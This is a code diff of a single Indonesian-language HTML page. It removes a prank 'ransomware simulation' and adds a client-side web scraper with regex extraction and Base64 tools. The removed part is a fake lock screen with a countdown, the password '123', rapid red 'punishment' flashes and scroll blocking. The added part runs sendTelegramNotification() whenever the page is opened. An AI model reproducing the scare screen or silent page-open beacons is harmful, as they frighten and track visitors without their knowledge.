+                        const headMatch = html.match(/<head[^>]*>([\s\S]*?)<\/head>/i);
+                        result = headMatch ? headMatch[1] : 'Head tidak ditemukan';
+                        break;
+                    case 'text':
+                        const text = html.replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim();
+                        result = text;
+                        break;
+                    case 'links':
+                        const links = html.match(/<a[^>]*href=["']([^"']*)["']/gi) || [];
+                        result = links.map(l => l.replace(/.*href=["']/, '').replace(/["'].*/, '')).join('\n');
+                        if (!result) result = 'Tidak ada link ditemukan';
+                        break;
+                    case 'images':
+                        const images = html.match(/<img[^>]*src=["']([^"']*)["']/gi) || [];
+                        result = images.map(l => l.replace(/.*src=["']/, '').replace(/["'].*/, '')).join('\n');
+                        if (!result) result = 'Tidak ada gambar ditemukan';
+                        break;
+                    case 'forms':
+                        const forms = html.match(/<form[^>]*>([\s\S]*?)<\/form>/gi) || [];
+                        result = forms.join('\n\n');
+                        if (!result) result = 'Tidak ada form ditemukan';
+                        break;
+                    default:
+                        result = html;
                 }
-                setTimeout(() => {
-                    flashOverlay.className = '';
-                    flashOverlay.style.opacity = '0';
-                }, 300);
-            }, 150 + Math.random() * 350);
-        }
 
-        function stopFlash() {
-            if (flashInterval) {
-                clearInterval(flashInterval);
-                flashInterval = null;
+                scrapedData = result;
+                resultContainer.textContent = result.substring(0, 5000) + (result.length > 5000 ? '\n\n... (truncated)' : '');
+                resultStatus.textContent = '✅ Success';
+                resultStatus.style.color = 'var(--success)';
+
+                scrapeCount++;
+                document.getElementById('totalScrape').textContent = scrapeCount;
+                uniqueUrls.add(url);
+                document.getElementById('uniqueUrls').textContent = uniqueUrls.size;
+                const size = new Blob([result]).size;
+                document.getElementById('totalSize').textContent = (size / 1024).toFixed(1) + ' KB';
+                document.getElementById('charCount').textContent = 'Karakter: ' + result.length;
+                document.getElementById('lineCount').textContent = 'Baris: ' + result.split('\n').length;
+
+                showToast(`✅ Berhasil mengambil ${result.length} karakter`);
+
+            } catch (error) {
+                resultContainer.innerHTML = `<span style="color:var(--danger);">❌ Error: ${error.message}</span>`;
+                resultStatus.textContent = '❌ Failed';
+                resultStatus.style.color = 'var(--danger)';
+                showToast('❌ Gagal mengambil data');
             }
-            flashOverlay.className = '';
-            flashOverlay.style.opacity = '0';
         }
 
-        // ============================================================
-        // 6. TIMER COUNTDOWN
-        // ============================================================
-        let totalSeconds = 72 * 3600;
+        // =============================================================
+        // 4. CLEAR RESULT
+        // =============================================================
+        function clearResult() {
+            scrapedData = '';
+            document.getElementById('resultContainer').innerHTML = '<span style="color:var(--text-muted);">Silakan masukkan URL dan tekan Scrape...</span>';
+            document.getElementById('resultStatus').textContent = 'Ready';
+            document.getElementById('resultStatus').style.color = 'var(--text-sec)';
+            document.getElementById('charCount').textContent = 'Karakter: 0';
+            document.getElementById('lineCount').textContent = 'Baris: 0';
+            showToast('🗑️ Result cleared');
+        }
 
-        function updateTimer() {
-            if (totalSeconds <= 0) {
-                document.getElementById('hours').textContent = '00';
-                document.getElementById('minutes').textContent = '00';
-                document.getElementById('seconds').textContent = '00';
+        // =============================================================
+        // 5. DOWNLOAD RESULT
+        // =============================================================
+        function downloadResult() {
+            if (!scrapedData) {
+                showToast('⚠️ Tidak ada data untuk di-download');
                 return;
             }
-            totalSeconds--;
-            const h = Math.floor(totalSeconds / 3600);
-            const m = Math.floor((totalSeconds % 3600) / 60);
-            const s = totalSeconds % 60;
-            document.getElementById('hours').textContent = String(h).padStart(2, '0');
-            document.getElementById('minutes').textContent = String(m).padStart(2, '0');
-            document.getElementById('seconds').textContent = String(s).padStart(2, '0');
+            const blob = new Blob([scrapedData], { type: 'text/html' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'scraped_result.html';
+            link.click();
+            showToast('⬇️ Download started');
         }
 
-        let timerInterval = setInterval(updateTimer, 1000);
-
-        // ============================================================
-        // 7. PROGRESS BAR
-        // ============================================================
-        let progress = 0;
-
-        function updateProgress() {
-            if (progress < 100) {
-                progress += Math.random() * 2 + 0.5;
-                if (progress > 100) progress = 100;
-                document.getElementById('progressFill').style.width = progress + '%';
-                document.getElementById('progressPercent').textContent = Math.floor(progress) + '%';
-            }
-            setTimeout(updateProgress, 300 + Math.random() * 400);
+        // =============================================================
+        // 6. TOOLS
+        // =============================================================
+        function getResultText() {
+            const container = document.getElementById('resultContainer');
+            return container.textContent || '';
         }
-        updateProgress();
 
-        // ============================================================
-        // 8. DECRYPT FUNCTION
-        // ============================================================
-        function decryptFiles() {
-            const input = document.getElementById('passwordInput');
-            const password = input.value.trim();
-            const statusMsg = document.getElementById('statusMsg');
-            const overlay = document.getElementById('overlay');
-            const decryptedPage = document.getElementById('decryptedPage');
+        function setResultText(text) {
+            const container = document.getElementById('resultContainer');
+            scrapedData = text;
+            container.textContent = text.substring(0, 5000) + (text.length > 5000 ? '\n\n... (truncated)' : '');
+            document.getElementById('charCount').textContent = 'Karakter: ' + text.length;
+            document.getElementById('lineCount').textContent = 'Baris: ' + text.split('\n').length;
+        }
 
-            statusMsg.className = 'status-msg';
+        function toolMinify() {
+            const text = getResultText();
+            if (!text) { showToast('⚠️ Tidak ada data'); return; }
+            const minified = text.replace(/\s+/g, ' ').replace(/>\s+</g, '><').trim();
+            setResultText(minified);
+            showToast('📦 HTML di-minify');
+        }
 
-            if (password === '') {
-                statusMsg.textContent = '⚠️ Please enter the password!';
-                statusMsg.className = 'status-msg error';
-                flashOverlay.className = 'active red';
-                flashOverlay.style.opacity = '0.6';
-                setTimeout(() => {
-                    flashOverlay.className = '';
-                    flashOverlay.style.opacity = '0';
-                }, 200);
-                return;
-            }
+        function toolBeautify() {
+            const text = getResultText();
+            if (!text) { showToast('⚠️ Tidak ada data'); return; }
+            const beautified = text.replace(/>/g, '>\n').replace(/</g, '\n<').replace(/\n\s*\n/g, '\n').trim();
+            setResultText(beautified);
+            showToast('✨ HTML di-beautify');
+        }
 
-            if (password === '123') {
-                // ✅ PASSWORD BENAR
-                statusMsg.textContent = '✅ PASSWORD CORRECT! Decrypting files...';
-                statusMsg.className = 'status-msg success';
+        function toolExtractText() {
+            const text = getResultText();
+            if (!text) { showToast('⚠️ Tidak ada data'); return; }
+            const clean = text.replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim();
+            setResultText(clean);
+            showToast('📝 Teks berhasil diekstrak');
+        }
 
-                flashOverlay.className = 'active green';
-                flashOverlay.style.opacity = '0.5';
-                setTimeout(() => {
-                    flashOverlay.className = '';
-                    flashOverlay.style.opacity = '0';
-                }, 300);
+        function toolExtractLinks() {
+            const text = getResultText();
+            if (!text) { showToast('⚠️ Tidak ada data'); return; }
+            const links = text.match(/https?:\/\/[^\s<>"']+/g) || [];
+            setResultText(links.join('\n'));
+            showToast(`🔗 Ditemukan ${links.length} link`);
+        }
 
-                // Simulasi dekripsi
-                let decryptProgress = 0;
-                const decryptInterval = setInterval(() => {
-                    decryptProgress += 10;
-                    if (decryptProgress >= 100) {
-                        clearInterval(decryptInterval);
-                        statusMsg.textContent = '🎉 ALL FILES DECRYPTED SUCCESSFULLY!';
-                        statusMsg.className = 'status-msg success';
-                        flashOverlay.className = 'active green';
-                        flashOverlay.style.opacity = '0.7';
-                        setTimeout(() => {
-                            flashOverlay.className = '';
-                            flashOverlay.style.opacity = '0';
-                        }, 500);
-                        setTimeout(() => {
-                            overlay.style.display = 'none';
-                            decryptedPage.style.display = 'flex';
-                            stopFlash();
-                        }, 800);
-                    }
-                    document.getElementById('progressFill').style.width = decryptProgress + '%';
-                    document.getElementById('progressPercent').textContent = decryptProgress + '%';
-                }, 300);
+        function toolBase64Encode() {
+            const text = getResultText();
+            if (!text) { showToast('⚠️ Tidak ada data'); return; }
+            setResultText(btoa(unescape(encodeURIComponent(text))));
+            showToast('🔐 Data di-encode Base64');
+        }
 
-            } else {
-                // ❌ PASSWORD SALAH
-                statusMsg.textContent = '❌ WRONG PASSWORD! Access denied.';
-                statusMsg.className = 'status-msg error';
-                input.value = '';
-                input.focus();
-
-                flashOverlay.className = 'active red';
-                flashOverlay.style.opacity = '0.8';
-                setTimeout(() => {
-                    flashOverlay.className = '';
-                    flashOverlay.style.opacity = '0';
-                }, 400);
-
-                let punishFlashes = 0;
-                const punishInterval = setInterval(() => {
-                    if (punishFlashes > 5) {
-                        clearInterval(punishInterval);
-                        return;
-                    }
-                    flashOverlay.className = 'active red';
-                    flashOverlay.style.opacity = '0.4';
-                    setTimeout(() => {
-                        flashOverlay.className = '';
-                        flashOverlay.style.opacity = '0';
-                    }, 100 + Math.random() * 100);
-                    punishFlashes++;
-                }, 200);
+        function toolBase64Decode() {
+            const text = getResultText();
+            if (!text) { showToast('⚠️ Tidak ada data'); return; }
+            try {
+                setResultText(decodeURIComponent(escape(atob(text))));
+                showToast('🔓 Data di-decode Base64');
+            } catch (e) {
+                showToast('❌ Bukan format Base64 yang valid');
             }
         }
 
-        // ============================================================
-        // 9. ENTER KEY SUPPORT
-        // ============================================================
-        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                decryptFiles();
-            }
-        });
-
-        // ============================================================
-        // 10. AUTO-FOCUS PASSWORD INPUT
-        // ============================================================
+        // =============================================================
+        // 7. KIRIM NOTIFIKASI KE TELEGRAM SAAT HALAMAN DI BUKA
+        // =============================================================
         window.addEventListener('load', function() {
-            document.getElementById('passwordInput').focus();
-            setTimeout(startFlash, 2000);
+            sendTelegramNotification();
+            showToast('🚀 WebScraper Pro siap!');
         });
 
-        // ============================================================
-        // 11. CONSOLE LOG
-        // ============================================================
-        console.log('%c🔒 RANSOMWARE SIMULASI v3.0', 'color: #ff0000; font-size: 20px; font-weight: 900;');
-        console.log('%cPassword: 123', 'color: #00ff41; font-size: 16px;');
-        console.log('%c⚠️ HANYA UNTUK EDUKASI!', 'color: #ff4444; font-size: 14px;');
-
-        // ============================================================
-        // 12. PREVENT SCROLL
-        // ============================================================
-        window.addEventListener('scroll', function() {
-            window.scrollTo(0, 0);
-        });
-
-        // ============================================================
-        // 13. PREVENT TOUCH MOVE (BLOKIR SCROLL)
-        // ============================================================
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-
-        console.log('✅ Ransomware siap! Password: 123');
-        console.log('💡 Semua aksi diblokir!');
+        // =============================================================
+        // 8. CONSOLE LOG
+        // =============================================================
+        console.log('%c🕸️ WebScraper Pro v2.0', 'color:#6c5ce7;font-size:20px;font-weight:700;');
+        console.log('%cBuilt by X-RAY 🔥', 'color:#6c5ce7;font-size:13px;');
+        console.log('%cWhatsApp: 6282155480068', 'color:#25d366;font-size:13px;');
+        console.log('✅ Siap mengambil HTML website orang!');
     </script>
+
 </body>
 </html>
